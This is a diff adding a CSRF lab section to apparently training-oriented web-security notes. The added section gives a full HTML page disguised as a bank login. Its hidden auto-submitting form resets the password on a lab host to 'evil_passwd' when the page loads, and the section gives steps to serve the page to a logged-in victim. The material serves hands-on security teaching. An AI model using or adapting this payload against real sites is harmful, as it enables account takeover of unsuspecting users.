@@ -147,3 +147,56 @@ Link was being fetched each time any user loads the webpage, so you inject a pay
 
     http://1.challenge.session.site/process_post.php?title=admin&body=admin&pic=http://google.com
 
+# CSRF Lab
+
+Save the following HTML code as
+
+    bank_login.html
+
+## HTML CODE
+    <html>
+    <head>
+        <title>Bank Login Page</title>
+    </head>
+    <body>
+        <div align="center">
+            <h1>Bank Login Page</h1>
+            <form>
+                <input type="text" name="username" value="" placeholder="Username"><br />
+                <input type="password" name="password" value="" placeholder="Password"><br />
+                <input type="submit" value="Login" />
+            </form>
+        </div>
+        <!-- Form target frame to avoid redirection -->
+        <iframe id="iframe" name="my_iframe" style="position: absolute;width:0;height:0;border:0;"></iframe>
+        <!-- CSRF - Update Password -->
+        <form name="csrf" id="csrf" target="my_iframe" action="http://demo.ine.local/csrf_1.php" method="GET">
+            <input type="hidden" name="password_new" value="evil_passwd">
+            <input type="hidden" name="password_conf" value="evil_passwd">
+            <input type="hidden" name="action" value="change">
+        </form>
+        <!-- Submit form -->
+        <script>
+            document.csrf.submit();
+        </script>
+    </body>
+    </html>
+
+Notice the HTML code - there is a hidden form that gets submitted as soon as the page loads:
+
+    <script>
+            document.csrf.submit();
+    </script>
+
+
+Start a Python-based HTTP server to serve the malicious page:
+
+    python3 -m http.server 80
+
+Open the malicious page in the private window, where the supposed victim user is logged in:
+
+    firefox http://localhost:80/bank_login.html
+
+The request will be sent immediatly on page load.
+
+So in conclusion, if the victim opens this link above, a GET request will be sent to **http://demo.ine.local/csrf_1.php** and it will update the password.
